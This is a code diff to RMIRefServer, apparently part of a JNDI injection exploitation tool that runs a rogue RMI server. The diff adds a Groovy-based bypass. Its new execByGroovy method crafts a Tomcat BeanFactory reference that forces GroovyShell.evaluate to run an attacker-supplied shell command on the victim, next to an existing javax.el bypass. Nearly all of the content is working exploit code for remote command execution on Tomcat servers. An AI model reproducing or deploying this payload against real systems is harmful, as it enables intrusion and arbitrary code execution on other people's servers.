@@ -352,11 +352,14 @@ public class RMIRefServer implements Runnable {
 
             ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
 
-            if (reference.startsWith("Bypass")){
+            if (reference.startsWith("Bypass") && !reference.contains("Groovy")){
                 System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference.");
                 Reflections.setFieldValue(rw, "wrappee", execByEL());
 
-            }else {
+            } else if (reference.endsWith("Groovy")) {
+                System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference.");
+                Reflections.setFieldValue(rw,"wrappee",execByGroovy());
+            } else {
                 System.out.println(
                         String.format(
                                 getLocalTime() + " [RMISERVER]  >> Sending remote classloading stub targeting %s",
@@ -376,7 +379,7 @@ public class RMIRefServer implements Runnable {
         return true;
     }
 
-    /*
+    /**
      * Need : Tomcat 8+ or SpringBoot 1.2.x+ in classpath，because of javax.el.ELProcessor.
      */
     public ResourceRef execByEL() {
@@ -391,6 +394,16 @@ public class RMIRefServer implements Runnable {
         return ref;
     }
 
+    /**
+     * Need: Tomcat and groovy in classpath.
+     */
+    public ResourceRef execByGroovy(){
+        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+        ref.add(new StringRefAddr("forceString", "x=evaluate"));
+        String script = String.format("'%s'.execute()", this.command);
+        ref.add(new StringRefAddr("x",script));
+        return ref;
+    }
 
     /**
      * @param ois
